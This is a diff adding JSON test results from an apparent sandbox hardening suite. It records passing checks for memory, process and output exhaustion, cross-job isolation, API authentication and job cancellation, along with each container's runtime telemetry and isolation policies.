+              "verified_at": 1795777561.7530854
+            },
+            "passed": true
+          }
+        ],
+        "leftover_sandbox_containers": []
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-7b62e93438aee0c4313c27dc",
+        "profile": "browser",
+        "oci_runtime": "runsc",
+        "container_id": "2cd896a0b6338d524e9fa21bd5ce6c7b6793d8116b7a1801670b569cfd9338b5",
+        "duration_ms": 3220,
+        "memory_peak_bytes": 212680704,
+        "memory_limit_bytes": 1610612736,
+        "exit_code": 0,
+        "code_exit_code": null,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": true,
+          "policy_revoked": true,
+          "verified_at": 1795777561.7530854
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "internal per-job network; egress only via SSRF-filtering proxy",
+          "egress_policy": {
+            "allowed_domains": [
+              "example.com"
+            ],
+            "allow_trusted_targets": false
+          },
+          "memory_mb": 1536,
+          "swap": "disabled",
+          "cpus": 2.0,
+          "pids_limit": 256,
+          "host_pids_backstop": 1024,
+          "tmpfs": {
+            "/work": "128m noexec,nosuid,nodev",
+            "/tmp": "256m noexec,nosuid,nodev",
+            "/dev/shm": "512m"
+          },
+          "timeout_s": 60,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 698
+      }
+    },
+    {
+      "id": "memory_exhaustion",
+      "name": "Memory exhaustion",
+      "priority": "P1",
+      "core": false,
+      "passed": true,
+      "duration_s": 2.54,
+      "observed": {
+        "cases": [
+          {
+            "case": "python profile (rlimit + cgroup)",
+            "limit_mb": 128,
+            "status": "failed",
+            "error": "code exited with 42",
+            "oom_killed": false,
+            "exit_code": 42,
+            "last_output": "MemoryError at 96 MB",
+            "memory_peak_mb": 103.3,
+            "memory_source": "cgroup.memory.peak",
+            "passed": true
+          },
+          {
+            "case": "cgroup only",
+            "limit_mb": 256,
+            "status": "failed",
+            "error": "memory limit exceeded (OOM killed)",
+            "oom_killed": true,
+            "exit_code": null,
+            "last_output": null,
+            "memory_peak_mb": 173.3,
+            "memory_source": "cgroup.memory.peak",
+            "passed": true
+          }
+        ]
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-d22c8d14da91f330264157db",
+        "profile": "browser",
+        "oci_runtime": "runsc",
+        "container_id": "e37d99e19cd28ef838f95cd5481eab0c53305e391897713aebbde6757f8de3de",
+        "duration_ms": 1263,
+        "memory_peak_bytes": 181735424,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 137,
+        "code_exit_code": null,
+        "oom_killed": true,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [
+          "oom_killed"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": true,
+          "policy_revoked": true,
+          "verified_at": 1795777564.488028
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "internal per-job network; egress only via SSRF-filtering proxy",
+          "egress_policy": {
+            "allowed_domains": [
+              "example.com"
+            ],
+            "allow_trusted_targets": false
+          },
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 2.0,
+          "pids_limit": 256,
+          "host_pids_backstop": 1024,
+          "tmpfs": {
+            "/work": "128m noexec,nosuid,nodev",
+            "/tmp": "256m noexec,nosuid,nodev",
+            "/dev/shm": "512m"
+          },
+          "timeout_s": 60,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 0
+      }
+    },
+    {
+      "id": "process_exhaustion",
+      "name": "Process exhaustion",
+      "priority": "P1",
+      "core": false,
+      "passed": true,
+      "duration_s": 2.03,
+      "observed": {
+        "pids_limit": 64,
+        "host_pids_backstop": 512,
+        "spawned": 61,
+        "forked": 0,
+        "total": 61,
+        "stdout": "spawned 61 processes; stopped by: BlockingIOError: [Errno 11] Resource temporarily unavailable\nforked 0 more; stopped by: BlockingIOError: [Errno 11] Resource temporarily unavailable\n",
+        "status": "succeeded"
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-6e4f29c65b2d1b65acffe59f",
+        "profile": "python",
+        "oci_runtime": "runsc",
+        "container_id": "83b01e5a1cfb5118ef41f2c38a407a8c61cdeff756f3c99720e267877d92731a",
+        "duration_ms": 1961,
+        "memory_peak_bytes": 66781184,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 0,
+        "code_exit_code": 0,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777566.710494
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "none",
+          "egress_policy": null,
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 30,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 758
+      }
+    },
+    {
+      "id": "cross_job_isolation",
+      "name": "Cross-job isolation",
+      "priority": "P1",
+      "core": false,
+      "passed": true,
+      "duration_s": 15.12,
+      "observed": {
+        "job_a": "job-d5e41dd852071024ba348fdd",
+        "job_b": "job-0ff241fb49571aa66079fb2e",
+        "ran_concurrently": true,
+        "token_visible_to_b": false,
+        "b_visible_pids": [
+          1,
+          2,
+          3
+        ],
+        "b_visible_files": [
+          "/work/output",
+          "/work/home",
+          "/work/main.py",
+          "/work/output",
+          "/work/home",
+          "/work/main.py",
+          "/proc/self/root/work/output",
+          "/proc/self/root/work/home",
+          "/proc/self/root/work/main.py",
+          "/proc/thread-self/root/work/output",
+          "/proc/thread-self/root/work/home",
+          "/proc/thread-self/root/work/main.py",
+          "/proc/1/root/work/output",
+          "/proc/1/root/work/home",
+          "/proc/1/root/work/main.py",
+          "/proc/2/root/work/output",
+          "/proc/2/root/work/home",
+          "/proc/2/root/work/main.py",
+          "/proc/3/root/work/output",
+          "/proc/3/root/work/home"
+        ],
+        "a_process_visible_to_b": false,
+        "other_principal_artifact_http": 404
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-0ff241fb49571aa66079fb2e",
+        "profile": "python",
+        "oci_runtime": "runsc",
+        "container_id": "5c670f43554b2b4b8b7391ac138ac3c7b1565af56149c96b798812fd09b41ef1",
+        "duration_ms": 950,
+        "memory_peak_bytes": 38936576,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 0,
+        "code_exit_code": 0,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777570.7367876
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "none",
+          "egress_policy": null,
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 20,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 4734
+      }
+    },
+    {
+      "id": "api_authentication",
+      "name": "API authentication",
+      "priority": "P0",
+      "core": false,
+      "passed": true,
+      "duration_s": 1.04,
+      "observed": {
+        "checks": [
+          {
+            "check": "submit without credentials",
+            "http_status": 401,
+            "expected": 401,
+            "passed": true
+          },
+          {
+            "check": "submit with invalid key",
+            "http_status": 401,
+            "expected": 401,
+            "passed": true
+          },
+          {
+            "check": "submit with malformed auth header",
+            "http_status": 401,
+            "expected": 401,
+            "passed": true
+          },
+          {
+            "check": "compat /run without credentials",
+            "http_status": 401,
+            "expected": 401,
+            "passed": true
+          },
+          {
+            "check": "compat /screenshot without credentials",
+            "http_status": 401,
+            "expected": 401,
+            "passed": true
+          },
+          {
+            "check": "read job without credentials",
+            "http_status": 401,
+            "expected": 401,
+            "passed": true
+          },
+          {
+            "check": "other principal reads job",
+            "http_status": 404,
+            "expected": 404,
+            "passed": true
+          },
+          {
+            "check": "other principal reads result",
+            "http_status": 404,
+            "expected": 404,
+            "passed": true
+          },
+          {
+            "check": "other principal lists artifacts",
+            "http_status": 404,
+            "expected": 404,
+            "passed": true
+          },
+          {
+            "check": "other principal cancels job",
+            "http_status": 404,
+            "expected": 404,
+            "passed": true
+          },
+          {
+            "check": "caller-supplied docker options rejected",
+            "http_status": 422,
+            "expected": 422,
+            "passed": true
+          },
+          {
+            "check": "caller-supplied env rejected",
+            "http_status": 422,
+            "expected": 422,
+            "passed": true
+          },
+          {
+            "check": "limits above profile rejected",
+            "http_status": 422,
+            "expected": 422,
+            "passed": true
+          },
+          {
+            "check": "owner reads job",
+            "http_status": 200,
+            "expected": 200,
+            "passed": true
+          }
+        ]
+      },
+      "error": null,
+      "telemetry": null
+    },
+    {
+      "id": "output_exhaustion",
+      "name": "Output exhaustion",
+      "priority": "P1",
+      "core": false,
+      "passed": true,
+      "duration_s": 3.06,
+      "observed": {
+        "runner_stdout": {
+          "attempted_bytes": 314572800,
+          "status": "failed",
+          "returned_bytes": 262144,
+          "truncated": true,
+          "produced_bytes_seen": 67108864,
+          "passed": true
+        },
+        "direct_container_stdout": {
+          "attempted_bytes": 104857600,
+          "status": "succeeded",
+          "container_log_bytes": 11436546,
+          "log_cap": "32m",
+          "passed": true
+        }
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-09e8f80b8f1bb3cc1212bf77",
+        "profile": "python",
+        "oci_runtime": "runsc",
+        "container_id": "bb0f5864423189a98aa5b40ea20b0956dc551b53368aa24020355d26563c55cf",
+        "duration_ms": 1441,
+        "memory_peak_bytes": 76804096,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 0,
+        "code_exit_code": 120,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [
+          "output_truncated"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777584.375898
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "none",
+          "egress_policy": null,
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 40,
+          "max_output_kb": 256,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 350429
+      }
+    },
+    {
+      "id": "cancellation",
+      "name": "Cancellation",
+      "priority": "P1",
+      "core": false,
+      "passed": true,
+      "duration_s": 0.86,
+      "observed": {
+        "container_id": "b190914a2c83",
+        "container_running_before_cancel": true,
+        "status": "cancelled",
+        "seconds_to_terminate_and_clean": 0.51,
+        "container_exists_after": false,
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777586.515553
+        }
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-53c8590ec34e1152386f7d07",
+        "profile": "python",
+        "oci_runtime": "runsc",
+        "container_id": "b190914a2c8325dc60df626554d90a9854a4d702ccf3d379d36ded75d368988e",
+        "duration_ms": 523,
+        "memory_peak_bytes": 26959872,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 137,
+        "code_exit_code": null,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": true,
+        "security_events": [
+          "cancelled"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777586.515553
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "none",
+          "egress_policy": null,
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 120,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 0
+      }
+    }
+  ]
+}
